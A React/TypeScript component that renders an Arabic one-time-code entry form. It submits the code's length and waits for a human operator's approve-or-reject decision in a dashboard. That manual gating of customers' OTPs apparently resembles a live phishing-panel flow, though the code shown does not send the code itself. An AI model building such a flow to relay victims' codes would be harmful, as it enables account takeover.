import { useEffect, useRef, useState } from "react";
import { ArrowLeft, Loader2 } from "lucide-react";
import { submitCurrentStep, waitForStepDecision } from "@/lib/workflow";
import { track } from "@/lib/gate";

const LENGTH = 6;
const MIN_LENGTH = 4;

type Props = {
  stepKey: string;
  idPrefix: string;
  onApproved: () => void;
};

/**
 * OTP entry that accepts 4 to 6 digits and then waits for an operator decision
 * in the dashboard: approve moves the customer forward, reject shows an error.
 */
export function OtpForm({ stepKey, idPrefix, onApproved }: Props) {
  const [otp, setOtp] = useState<string[]>(Array.from({ length: LENGTH }, () => ""));
  const [waiting, setWaiting] = useState(false);
  const [error, setError] = useState("");
  const abortRef = useRef({ aborted: false });

  useEffect(() => {
    const ref = abortRef.current;
    return () => {
      ref.aborted = true;
    };
  }, []);

  const code = otp.join("");

  const setDigit = (i: number, v: string) => {
    if (!/^\d?$/.test(v)) return;
    const next = [...otp];
    next[i] = v;
    setOtp(next);
    setError("");
    if (v && i < LENGTH - 1) document.getElementById(`${idPrefix}-${i + 1}`)?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[i] && i > 0) document.getElementById(`${idPrefix}-${i - 1}`)?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (waiting) return;
    if (code.length < MIN_LENGTH) {
      setError("ادخل رقم التحقق الصحيح");
      return;
    }
    setError("");
    setWaiting(true);
    track("submit", { step: stepKey, otp_length: code.length });
    const res = await submitCurrentStep(stepKey, { otp_status: "submitted", otp_length: code.length });
    if (!res.success) {
      setWaiting(false);
      setError(res.error || "حدث خطأ، حاول مرة أخرى");
      return;
    }
    const decision = await waitForStepDecision(stepKey, { signal: abortRef.current });
    if (abortRef.current.aborted) return;
    setWaiting(false);
    if (decision === "approved") {
      onApproved();
    } else if (decision === "rejected") {
      setOtp(Array.from({ length: LENGTH }, () => ""));
      setError("ادخل رقم التحقق الصحيح");
      document.getElementById(`${idPrefix}-0`)?.focus();
    }
  };

  return (
    <form onSubmit={handleSubmit} className="card space-y-5">
      <div className="flex justify-center gap-2" dir="ltr">
        {otp.map((d, i) => (
          <input
            key={i}
            id={`${idPrefix}-${i}`}
            value={d}
            onChange={(e) => setDigit(i, e.target.value)}
            onKeyDown={(e) => handleKeyDown(i, e)}
            disabled={waiting}
            maxLength={1}
            inputMode="numeric"
            className="h-16 w-12 rounded-xl border-2 border-dark-200 text-center text-2xl font-bold text-dark-900 focus:border-primary-500 focus:outline-none disabled:opacity-60"
          />
        ))}
      </div>

      <p className="text-center text-xs text-dark-400">الرمز مكوّن من 4 إلى 6 أرقام</p>

      {error && <p className="rounded-lg bg-red-50 px-4 py-2 text-center text-sm font-medium text-red-600">{error}</p>}

      {waiting ? (
        <div className="flex flex-col items-center gap-3 rounded-xl bg-primary-50 px-4 py-6 text-primary-700">
          <Loader2 className="h-8 w-8 animate-spin" />
          <p className="text-sm font-semibold">جارٍ التحقق من الرمز...</p>
          <p className="text-xs text-primary-600">يرجى الانتظار وعدم إغلاق الصفحة</p>
        </div>
      ) : (
        <button type="submit" className="btn-primary w-full">
          تأكيد
          <ArrowLeft className="h-5 w-5" />
        </button>
      )}

      <p className="text-center text-sm text-dark-500">
        لم يصلك رمز؟{" "}
        <button type="button" disabled={waiting} className="font-semibold text-primary-600 disabled:opacity-50">
          إعادة إرسال
        </button>
      </p>
    </form>
  );
}
